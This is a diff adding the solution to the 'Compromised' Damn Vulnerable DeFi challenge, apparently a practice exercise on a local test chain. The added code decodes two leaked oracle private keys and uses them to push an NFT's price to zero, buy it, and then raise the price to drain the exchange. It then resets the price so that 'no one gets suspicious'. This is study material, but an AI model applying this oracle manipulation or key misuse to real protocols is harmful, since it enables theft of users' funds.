@@ -61,6 +61,56 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        // https://www.damnvulnerabledefi.xyz/challenges/7.html -> Server returns the private keys 
+        // of two oracles TRUSTED_SORUCE_ROLEs as hex data. Decoding the keys gives
+        // two out of the three trusted sources. Consensus of the oracles is compromised.
+        // We will decode as in this order:hex->base64->private key
+        // Hex is given in the site. Decoding to base64:
+        // base64_0:MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+        // base64_1:MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+        // decoding base64s to private keys:
+        // PK0:0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+        // PK1:0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+        // We have our private keys.
+
+        const oracleZeroTSRPrivateKey = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"
+        const oracleOneTSRPrivateKey = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
+        
+        const TSRPKZero = new ethers.Wallet(oracleZeroTSRPrivateKey,ethers.provider);
+        const TSRPKOne = new ethers.Wallet(oracleOneTSRPrivateKey,ethers.provider);
+
+        const tokenHandle = "DVNFT";
+
+        const maxPrice = EXCHANGE_INITIAL_ETH_BALANCE //max target price.
+
+        //there are three trusted sources. _computeMedianPrice will sort the prices and return the middle
+        //element.
+        //With two sources, we will first tank the price greatly and buy at that price,
+        //Then we will pump price greatly(in exact amount:balance of the exchange contract) and
+        //sell at that price. 
+
+
+        // Tank the price
+        const compromisedSources = [TSRPKZero,TSRPKOne];
+        for(let acc of compromisedSources){
+            await this.oracle.connect(acc).postPrice(tokenHandle,0);
+        }
+
+        //buy one with the tanked prices
+        await this.exchange.connect(attacker).buyOne({value:ethers.utils.parseEther("0.01")});
+
+        // pump the price 
+        for(let acc of compromisedSources){
+            await this.oracle.connect(acc).postPrice(tokenHandle,maxPrice);
+        }
+        //dump the highly valued nft
+        await this.nftToken.connect(attacker).approve(this.exchange.address,0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        //Reset the nft price so no one gets suspicious
+        for(let acc of compromisedSources){
+            await this.oracle.connect(acc).postPrice(tokenHandle,INITIAL_NFT_PRICE);
+        }
     });
 
     after(async function () {
